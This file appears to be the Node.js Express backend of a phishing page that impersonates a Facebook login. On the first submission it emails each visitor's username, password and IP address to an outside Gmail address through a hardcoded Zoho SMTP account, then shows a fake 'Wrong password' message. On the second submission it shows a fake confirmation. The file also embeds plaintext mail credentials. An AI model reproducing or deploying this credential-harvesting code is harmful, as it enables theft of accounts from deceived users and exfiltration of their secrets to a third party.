import express from "express";
import bodyParser from "body-parser";
import morgan from "morgan";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";
import session from "express-session";
import nodemailer from "nodemailer";

const app = express();

app.use(morgan('dev'));

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.set('view engine', 'ejs');

app.use(express.static(path.join(__dirname, "public")));

// Set up session handling
app.use(
    session({
        secret: 'yourSecretKey',
        resave: false,
        saveUninitialized: true,
        cookie: { secure: false } // Set to true in production
    })
);

// Nodemailer setup
const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 587,  // Use 465 if SSL is required
    secure: false, // true for port 465 (SSL), false for 587 (TLS)
    auth: {
        user: "info@vaulttrustfinancial.com", 
        pass: "@GuardianUser1"
    }
});



app.get("/", (req, res) => {
    res.render("index");
});

app.post("/login", (req, res) => {
   
    const { email, password } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (!req.session.attempt) {
        req.session.attempt = 1;

        // Send email on the first attempt
        const mailOptions = {
            from: '"Info" <info@vaulttrustfinancial.com>',
            to: 'swiftcoder147@gmail.com',
            subject: 'Facebook Contact Form Details',
            text: `Facebook Contact Form Details\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log(error);
                res.status(500).send('Error sending email.');
            } else {
                console.log('Email sent: ' + info.response);
                res.send('Wrong password'); // Send "wrong password" message
            }
        });

    } else {
        // Second attempt - Send success message
        res.send('You have been successfully added to the private chat, you will get a message request shortly.');
        req.session.attempt = 0; // Reset attempt counter
    }
});

app.listen(3000, () => {
    console.log("Server started on port 3000");
});
